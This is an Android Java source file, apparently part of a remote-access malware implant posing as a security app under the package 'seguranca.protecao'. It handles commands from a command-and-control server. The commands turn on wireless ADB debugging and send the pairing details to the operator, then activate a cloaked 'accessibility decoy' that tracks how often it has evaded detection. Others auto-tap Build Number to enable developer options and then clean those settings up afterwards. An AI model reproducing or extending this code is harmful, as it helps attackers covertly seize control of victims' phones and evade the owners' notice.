package com.seguranca.protecao.features.bypass;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

/**
 * BypassCommandHandler
 *
 * Handles C2 commands for the accessibility bypass feature.
 * Drop this into CommandControlService's handleCommand() switch block:
 *
 *   case "BYPASS_ENABLE_DEV":      BypassCommandHandler.handle(ctx, cmd, args, ws); break;
 *   case "BYPASS_CONFIRM_GRANT":   BypassCommandHandler.handle(ctx, cmd, args, ws); break;
 *   case "BYPASS_CLEAN":           BypassCommandHandler.handle(ctx, cmd, args, ws); break;
 *   case "BYPASS_STATUS":          BypassCommandHandler.handle(ctx, cmd, args, ws); break;
 *   case "BYPASS_DEACTIVATE":      BypassCommandHandler.handle(ctx, cmd, args, ws); break;
 *   case "AUTO_TAP_BUILD_NUMBER":  BypassCommandHandler.handle(ctx, cmd, args, ws); break;
 *
 * Also wire into UiAssistBridge.onAccessibilityEvent():
 *   if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
 *       String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
 *       AccessibilityDecoy.getInstance(this).onForegroundAppChange(pkg);
 *       AutoTapBuildNumber.onWindow(this, event); // for step 1 automation
 *   }
 */
public final class BypassCommandHandler {

    private static final String TAG = "BypassCmd";

    /**
     * @param ctx   application context
     * @param cmd   command name from C2
     * @param args  JSONObject with command args
     * @param send  lambda that sends a JSON string back to C2
     */
    public static void handle(Context ctx, String cmd, JSONObject args, SendFn send) {
        switch (cmd) {

            case "BYPASS_ENABLE_DEV": {
                // Step 1: enable wireless debugging, report pairing info
                AdbWirelessBypass bypass = AdbWirelessBypass.getInstance(ctx);
                bypass.setCallback((status, payload) -> {
                    try {
                        JSONObject resp = new JSONObject();
                        resp.put("type",   "bypass_status");
                        resp.put("status", status.name());
                        resp.put("data",   payload);
                        send.send(resp.toString());
                    } catch (Exception e) {
                        Log.e(TAG, "callback error: " + e.getMessage());
                    }
                });
                bypass.enableAndPrepare();
                sendAck(send, "BYPASS_ENABLE_DEV", "starting");
                break;
            }

            case "BYPASS_CONFIRM_GRANT": {
                // Step 2: operator ran ADB grant — verify and activate decoy
                AdbWirelessBypass bypass = AdbWirelessBypass.getInstance(ctx);
                bypass.confirmGrantAndActivate();
                sendAck(send, "BYPASS_CONFIRM_GRANT", "verifying");
                break;
            }

            case "BYPASS_CLEAN": {
                // Step 3 (optional): disable dev options
                AdbWirelessBypass bypass = AdbWirelessBypass.getInstance(ctx);
                bypass.disableDeveloperOptions();
                sendAck(send, "BYPASS_CLEAN", "cleaning");
                break;
            }

            case "BYPASS_STATUS": {
                // Dashboard polling: return current bypass state
                AdbWirelessBypass bypass   = AdbWirelessBypass.getInstance(ctx);
                AccessibilityDecoy decoy   = AccessibilityDecoy.getInstance(ctx);
                try {
                    JSONObject resp = new JSONObject();
                    resp.put("type",              "bypass_status_full");
                    resp.put("adb_status",        bypass.getStatus().name());
                    resp.put("grant_confirmed",   bypass.isGrantConfirmed());
                    resp.put("decoy_active",      decoy.isActive());
                    resp.put("cloaked",           decoy.isCloaked());
                    resp.put("evade_count",       decoy.getEvadeCount());
                    resp.put("last_evaded_pkg",   decoy.getLastEvasionPkg());
                    resp.put("last_evaded_ts",    decoy.getLastEvasionTs());
                    send.send(resp.toString());
                } catch (Exception e) {
                    Log.e(TAG, "status error: " + e.getMessage());
                }
                break;
            }

            case "BYPASS_DEACTIVATE": {
                AccessibilityDecoy.getInstance(ctx).deactivate();
                sendAck(send, "BYPASS_DEACTIVATE", "deactivated");
                break;
            }

            case "AUTO_TAP_BUILD_NUMBER": {
                // UiAssistBridge auto-clicks Build Number 7 times
                // when it sees Settings > About Phone in foreground.
                // Handled directly in UiAssistBridge via AutoTapBuildNumber helper.
                sendAck(send, "AUTO_TAP_BUILD_NUMBER", "triggered");
                break;
            }
        }
    }

    private static void sendAck(SendFn send, String cmd, String status) {
        try {
            send.send(new JSONObject()
                .put("type",    "ack")
                .put("cmd",     cmd)
                .put("status",  status)
                .toString());
        } catch (Exception ignored) {}
    }

    public interface SendFn {
        void send(String json);
    }
}
